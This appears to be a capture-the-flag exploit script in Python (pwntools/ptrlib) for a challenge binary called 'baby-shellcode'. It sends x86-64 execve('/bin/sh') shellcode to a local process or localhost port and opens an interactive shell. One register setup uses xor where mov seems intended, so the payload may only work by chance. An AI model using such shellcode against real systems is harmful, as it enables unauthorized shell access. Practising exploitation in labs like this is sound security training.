#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./baby-shellcode")
pwn.context.binary = pwn.ELF(exe.filepath)
# libc = ptr.ELF(".")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def asm(code: list[str]) -> bytes:
    r = ""
    for i in code:
        r += f"{i};"
    return pwn.asm(r)


def main():
    io = connect()

    binsh_int = ptr.u64(b"/bin/sh\0")
    code = [
        "xor rax, rax",
        f"mov rax, {binsh_int}",
        "mov [rsp], rax",
        "xor rdi, rsp",
        "xor rsi, rsi",
        "xor rdx, rdx",
        "mov rax, 59",
        "syscall",
    ]

    io.sendline(asm(code))

    io.interactive()
    return


if __name__ == "__main__":
    main()
